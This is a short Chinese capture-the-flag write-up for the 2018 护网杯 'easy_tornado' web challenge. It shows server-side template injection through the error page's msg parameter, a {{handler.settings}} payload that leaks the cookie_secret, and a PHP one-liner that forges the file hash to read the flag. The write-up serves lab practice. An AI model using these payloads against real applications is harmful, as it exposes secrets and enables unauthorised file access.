# 护网杯 2018

## Web

### easy\_tornado

可以获得三个信息

1. flag in /fllllllllllllag
2. render
3. md5(cookie\_secret+md5(filename))
4. `/file?filename=/hints.txt&filehash=a80a87f16b53b615041eb1662300f6ff`

结合题目可以发现是 SSTI 注入攻击，在 Error 页面发现了可注入变量 msg

`http://e5f14720-a920-4249-b329-2b8a871f9a6d.node4.buuoj.cn:81/error?msg={{1}}`

通过 msg 变量获取 tornado 模板的 cookie\_secret 值，即构造 payload `msg={{handler.settings}}` 即可获得 cookie\_secret 值 `c5a970de-a479-405e-aad4-2f4212d9596c` 之后通过编写 PHP 代码

```php
<?php echo md5('c5a970de-a479-405e-aad4-2f4212d9596c'.md5('/fllllllllllllag')) ?>
```

即可获得 filehash 值 `935bb7616e76314e48487e6e96a2a4ab` ，通过构造 payload `filename=/fllllllllllllag&filehash=935bb7616e76314e48487e6e96a2a4ab` 即可获取到 flag
